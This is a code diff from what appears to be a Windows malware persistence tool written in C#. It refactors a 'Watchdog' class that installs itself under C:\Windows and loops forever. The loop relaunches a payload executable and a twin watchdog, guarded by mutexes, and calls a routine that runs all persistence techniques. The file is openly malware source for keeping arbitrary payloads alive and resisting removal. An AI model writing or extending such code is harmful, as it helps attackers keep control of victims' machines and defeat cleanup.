@@ -20,26 +20,10 @@ Persistence functionality
 
 class Watchdog
 {
-    public static string PayloadPath { get; private set; } = @"C:\Windows\Test\Test2";
-    public static string PayloadName { get; private set; } = "TestPayload.exe";
-
-
- 
-    public static string SecondaryWatchdogPath { get; private set; } = @"C:\Windows\Test\Test1";
-    public static string SecondaryWatchdogName { get; private set; } = "TestApp.exe"; 
-    public static string SecondaryWatchdogMutexName { get; private set; } = "SecondaryWDog";
-
-
-    public static string PrimaryWatchdogPath { get; private set; } = @"C:\Windows\Test";
-    public static string PrimaryWatchdogName { get; private set; } = "WindowsPersistence.exe";
-    public static string PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
-
-
-
-    static void Main(string[] args)
+   static void Main(string[] args)
     {
         // Create or open the mutex to ensure only one instance is running
-        using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
+        using (Mutex mutex = new Mutex(false, Config.PrimaryWatchdogMutexName, out bool isNewInstance))
         {
             if (!isNewInstance)
             {
@@ -56,20 +40,20 @@ class Watchdog
 
     static void WatchdogLogic()
     {
-        string PrimaryWatchdogFullPath = Path.Combine(PrimaryWatchdogPath, PrimaryWatchdogName);
-        if(!File.Exists(Path.Combine(SecondaryWatchdogPath, PrimaryWatchdogName)))
+        string PrimaryWatchdogFullPath = Path.Combine(Config.PrimaryWatchdogPath, Config.PrimaryWatchdogName);
+        if(!File.Exists(Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName)))
         {
-            File.Copy(PrimaryWatchdogFullPath, Path.Combine(SecondaryWatchdogPath,PrimaryWatchdogName), overwrite: false);
+            File.Copy(PrimaryWatchdogFullPath, Path.Combine(Config.SecondaryWatchdogPath,Config.PrimaryWatchdogName), overwrite: false);
         }
 
         // Example loop to simulate frequent checks
         while (true)
         {
-            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(PayloadPath, PayloadName);
-            watchdogHelper.watchdogHelper.CheckAndRunPayload(PayloadPath, PayloadName);
+            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
+            watchdogHelper.watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
 
-            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(SecondaryWatchdogPath, SecondaryWatchdogName);
-            watchdogHelper.watchdogHelper.CheckAndRunWatchdog(SecondaryWatchdogPath, SecondaryWatchdogName, SecondaryWatchdogMutexName);
+            watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
+            watchdogHelper.watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);
 
             Persistence.Persistence.runAllTechniques();
 
